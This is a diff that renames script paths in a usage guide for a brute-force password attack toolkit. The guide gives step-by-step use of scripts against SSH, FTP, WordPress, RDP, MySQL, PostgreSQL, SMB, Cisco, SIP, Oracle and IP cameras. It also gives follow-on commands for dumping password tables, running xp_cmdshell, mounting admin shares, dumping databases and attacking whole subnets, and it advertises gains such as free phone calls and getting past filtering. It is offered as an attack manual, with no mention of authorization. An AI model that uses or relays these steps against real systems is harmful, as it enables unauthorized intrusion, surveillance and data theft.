@@ -49,16 +49,16 @@ This document provides detailed explanations and instructions for all specialize
 - Remote command execution
 - File transfer via SCP/SFTP
 
-**Attack Script**: `Library/ssh_quick.sh`
+**Attack Script**: `scripts/ssh_quick.sh`
 
 **Step-by-Step**:
 ```bash
 # 1. Edit the target
-nano Library/ssh_quick.sh
+nano scripts/ssh_quick.sh
 # Change: TARGET="192.168.1.100"
 
 # 2. Run
-bash Library/ssh_quick.sh
+bash scripts/ssh_quick.sh
 
 # 3. Result example:
 # [+] SUCCESS! Username: root, Password: toor123
@@ -88,16 +88,16 @@ bash Library/ssh_quick.sh
 - Backup transfers
 - Legacy file sharing
 
-**Attack Script**: `Library/ftp_quick.sh`
+**Attack Script**: `scripts/ftp_quick.sh`
 
 **Step-by-Step**:
 ```bash
 # 1. Edit
-nano Library/ftp_quick.sh
+nano scripts/ftp_quick.sh
 # Change: TARGET="ftp.example.com"
 
 # 2. Run
-bash Library/ftp_quick.sh
+bash scripts/ftp_quick.sh
 
 # 3. Result:
 # [+] SUCCESS! Username: ftpuser, Password: upload123
@@ -129,19 +129,19 @@ bash Library/ftp_quick.sh
 - Custom admin panels
 
 **Attack Scripts**:
-- `Library/web_quick.sh` - Generic web admin
-- `Library/wordpress_quick.sh` - WordPress specific
-- `Library/http_basic_auth.sh` - HTTP Basic Auth
-- `Library/web_directory_bruteforce.sh` - Find admin panels
+- `scripts/web_quick.sh` - Generic web admin
+- `scripts/wordpress_quick.sh` - WordPress specific
+- `scripts/http_basic_auth.sh` - HTTP Basic Auth
+- `scripts/web_directory_bruteforce.sh` - Find admin panels
 
 **Step-by-Step (WordPress)**:
 ```bash
 # 1. Edit
-nano Library/wordpress_quick.sh
+nano scripts/wordpress_quick.sh
 # Change: TARGET="http://example.com"
 
 # 2. Run
-bash Library/wordpress_quick.sh
+bash scripts/wordpress_quick.sh
 
 # 3. Result:
 # [+] SUCCESS! Username: admin, Password: Welcome123!
@@ -174,16 +174,16 @@ bash Library/wordpress_quick.sh
 - Remote work access
 - IT support
 
-**Attack Script**: `Library/rdp_quick.sh`
+**Attack Script**: `scripts/rdp_quick.sh`
 
 **Step-by-Step**:
 ```bash
 # 1. Edit
-nano Library/rdp_quick.sh
+nano scripts/rdp_quick.sh
 # Change: TARGET="192.168.1.50"
 
 # 2. Run
-bash Library/rdp_quick.sh
+bash scripts/rdp_quick.sh
 
 # 3. Result:
 # [+] SUCCESS! Username: Administrator, Password: P@ssw0rd
@@ -223,16 +223,16 @@ mstsc /v:192.168.1.50
 - Application data storage
 - User credential storage
 
-**Attack Script**: `Library/mysql_quick.sh`
+**Attack Script**: `scripts/mysql_quick.sh`
 
 **Step-by-Step**:
 ```bash
 # 1. Edit
-nano Library/mysql_quick.sh
+nano scripts/mysql_quick.sh
 # Change: TARGET="192.168.1.100"
 
 # 2. Run
-bash Library/mysql_quick.sh
+bash scripts/mysql_quick.sh
 
 # 3. Result:
 # [+] SUCCESS! Username: root, Password: mysql123
@@ -273,16 +273,16 @@ SELECT user_login, user_pass FROM wp_users;
 - Geographic data
 - Complex queries
 
-**Attack Script**: `Library/postgres_quick.sh`
+**Attack Script**: `scripts/postgres_quick.sh`
 
 **Step-by-Step**:
 ```bash
 # 1. Edit
-nano Library/postgres_quick.sh
+nano scripts/postgres_quick.sh
 # Change: TARGET="192.168.1.100"
 
 # 2. Run
-bash Library/postgres_quick.sh
+bash scripts/postgres_quick.sh
 
 # 3. Result:
 # [+] SUCCESS! Username: postgres, Password: admin123
@@ -324,16 +324,16 @@ pg_dump -h 192.168.1.100 -U postgres database_name > dump.sql
 - Shared printers
 - Inter-computer communication
 
-**Attack Script**: `Library/smb_quick.sh`
+**Attack Script**: `scripts/smb_quick.sh`
 
 **Step-by-Step**:
 ```bash
 # 1. Edit
-nano Library/smb_quick.sh
+nano scripts/smb_quick.sh
 # Change: TARGET="192.168.1.50"
 
 # 2. Run
-bash Library/smb_quick.sh
+bash scripts/smb_quick.sh
 
 # 3. Result:
 # [+] SUCCESS! Username: Administrator, Password: admin123
@@ -372,7 +372,7 @@ mount -t cifs //192.168.1.50/C$ /mnt/share -o username=Administrator,password=ad
 - Corporate user directories
 - Single sign-on
 
-**Attack Script**: `Library/ldap_quick.sh`
+**Attack Script**: `scripts/ldap_quick.sh`
 
 **Why it matters**:
 - Domain admin = entire network access
@@ -398,7 +398,7 @@ mount -t cifs //192.168.1.50/C$ /mnt/share -o username=Administrator,password=ad
 - SharePoint backends
 - Financial systems
 
-**Attack Script**: `Library/mssql_quick.sh`
+**Attack Script**: `scripts/mssql_quick.sh`
 
 **Special features**:
 - Can execute OS commands via `xp_cmdshell`
@@ -433,7 +433,7 @@ EXEC xp_cmdshell 'whoami';
 - Big data storage
 - Flexible schema data
 
-**Attack Script**: `Library/mongodb_quick.sh`
+**Attack Script**: `scripts/mongodb_quick.sh`
 
 **Common issue**: Often misconfigured with no authentication
 
@@ -468,7 +468,7 @@ db.users.find()
 - Caching
 - Real-time analytics
 
-**Attack Script**: `Library/redis_quick.sh`
+**Attack Script**: `scripts/redis_quick.sh`
 
 **Common vulnerability**: No auth by default
 
@@ -496,16 +496,16 @@ db.users.find()
 - API endpoints
 - Legacy systems
 
-**Attack Script**: `Library/http_basic_auth.sh`
+**Attack Script**: `scripts/http_basic_auth.sh`
 
 **How to use**:
 ```bash
 # 1. Edit target
-nano Library/http_basic_auth.sh
+nano scripts/http_basic_auth.sh
 # Change: TARGET="http://example.com/admin"
 
 # 2. Run attack
-bash Library/http_basic_auth.sh
+bash scripts/http_basic_auth.sh
 
 # 3. Access with credentials
 curl -u admin:password123 http://example.com/admin
@@ -529,7 +529,7 @@ curl -u admin:password123 http://example.com/admin
 - Content filtering
 - Traffic monitoring
 
-**Attack Script**: `Library/http_proxy_auth.sh`
+**Attack Script**: `scripts/http_proxy_auth.sh`
 
 **Why attack it**:
 - Bypass internet restrictions
@@ -549,16 +549,16 @@ curl -u admin:password123 http://example.com/admin
 - Switch management
 - Network control
 
-**Attack Script**: `Library/cisco_enable.sh`
+**Attack Script**: `scripts/cisco_enable.sh`
 
 **Step-by-Step**:
 ```bash
 # 1. Edit
-nano Library/cisco_enable.sh
+nano scripts/cisco_enable.sh
 # Change: TARGET="192.168.1.1"
 
 # 2. Run (LOW threads - Cisco is sensitive!)
-bash Library/cisco_enable.sh
+bash scripts/cisco_enable.sh
 
 # 3. Result:
 # [+] SUCCESS! Enable password: cisco123
@@ -597,7 +597,7 @@ enable
 - Call centers
 - VoIP communications
 
-**Attack Script**: `Library/asterisk_sip.sh`
+**Attack Script**: `scripts/asterisk_sip.sh`
 
 **What you get**:
 - Free phone calls
@@ -608,11 +608,11 @@ enable
 **How to use**:
 ```bash
 # 1. Edit
-nano Library/asterisk_sip.sh
+nano scripts/asterisk_sip.sh
 # Change: TARGET="192.168.1.100"
 
 # 2. Run
-bash Library/asterisk_sip.sh
+bash scripts/asterisk_sip.sh
 
 # 3. Result:
 # [+] SUCCESS! Extension: 100, Password: 1234
@@ -641,17 +641,17 @@ bash Library/asterisk_sip.sh
 - Financial applications
 - ERP systems (SAP, PeopleSoft)
 
-**Attack Script**: `Library/oracle_db.sh`
+**Attack Script**: `scripts/oracle_db.sh`
 
 **Step-by-Step**:
 ```bash
 # 1. Edit target and SID
-nano Library/oracle_db.sh
+nano scripts/oracle_db.sh
 # Change: TARGET="192.168.1.100"
 # Change: SID="ORCL"  # Or XE, PROD, etc.
 
 # 2. Run (LOW threads!)
-bash Library/oracle_db.sh
+bash scripts/oracle_db.sh
 
 # 3. Result:
 # [+] SUCCESS! Username: system, Password: oracle123
@@ -682,16 +682,16 @@ bash Library/oracle_db.sh
 - DVR/NVR systems
 - Surveillance networks
 
-**Attack Script**: `Library/rtsp_camera.sh`
+**Attack Script**: `scripts/rtsp_camera.sh`
 
 **Step-by-Step**:
 ```bash
 # 1. Edit
-nano Library/rtsp_camera.sh
+nano scripts/rtsp_camera.sh
 # Change: TARGET="192.168.1.200"
 
 # 2. Run
-bash Library/rtsp_camera.sh
+bash scripts/rtsp_camera.sh
 
 # 3. Result:
 # [+] SUCCESS! Username: admin, Password: 12345
@@ -809,12 +809,12 @@ ffplay rtsp://admin:12345@192.168.1.200:554/stream
 **Step-by-Step**:
 ```bash
 # 1. Edit
-nano Library/combo_full_infrastructure.sh
+nano scripts/combo_full_infrastructure.sh
 # Change: TARGET="192.168.1.100"
 # Or: TARGET="192.168.1.0/24"  # Entire subnet!
 
 # 2. Run (this takes a while!)
-bash Library/combo_full_infrastructure.sh
+bash scripts/combo_full_infrastructure.sh
 
 # 3. Wait...
 # [*] Testing SSH...
@@ -872,11 +872,11 @@ bash scripts/results_viewer.sh --target 192.168.1.100
 
 ```bash
 # 1. Find admin panel
-bash Library/web_directory_bruteforce.sh
+bash scripts/web_directory_bruteforce.sh
 # Edit: TARGET="http://example.com"
 
 # 2. Attack WordPress
-bash Library/wordpress_quick.sh
+bash scripts/wordpress_quick.sh
 # Edit: TARGET="http://example.com"
 
 # 3. Success! Login at /wp-admin
@@ -886,7 +886,7 @@ bash Library/wordpress_quick.sh
 # Tools → Site Health → Info → Database
 
 # 5. Attack database
-bash Library/mysql_quick.sh
+bash scripts/mysql_quick.sh
 # Edit: TARGET="db.example.com"
 
 # 6. Dump all data
@@ -897,21 +897,21 @@ bash scripts/results_viewer.sh --protocol mysql
 
 ```bash
 # 1. Network discovery
-bash Library/nmap_network_discovery.sh
+bash scripts/nmap_network_discovery.sh
 # Edit: TARGET="192.168.1.0/24"
 
 # 2. Find live hosts (let's say 192.168.1.100)
 
 # 3. Full port scan
-bash Library/nmap_full_scan.sh
+bash scripts/nmap_full_scan.sh
 # Edit: TARGET="192.168.1.100"
 
 # 4. Vulnerability scan
-bash Library/nmap_vuln_scan.sh
+bash scripts/nmap_vuln_scan.sh
 # Edit: TARGET="192.168.1.100"
 
 # 5. Attack all found services
-bash Library/combo_full_infrastructure.sh
+bash scripts/combo_full_infrastructure.sh
 # Edit: TARGET="192.168.1.100"
 
 # 6. Review results
@@ -922,12 +922,12 @@ bash scripts/results_viewer.sh --target 192.168.1.100
 
 ```bash
 # 1. Find database servers
-bash Library/nmap_full_scan.sh
+bash scripts/nmap_full_scan.sh
 # Edit: TARGET="10.0.0.0/24"
 # Look for ports: 3306 (MySQL), 5432 (PostgreSQL), 1433 (MSSQL), 27017 (MongoDB)
 
 # 2. Attack all databases
-bash Library/combo_db_cluster.sh
+bash scripts/combo_db_cluster.sh
 # Edit: TARGET="10.0.0.50"
 
 # 3. Export all database credentials
@@ -1075,7 +1075,7 @@ bash scripts/results_viewer.sh
 - Main launcher: 1
 - Documentation: 7
 
-**For complete list**: See `Library/README_COMPLETE.md`
+**For complete list**: See `scripts/README_COMPLETE.md`
 
 ---
 
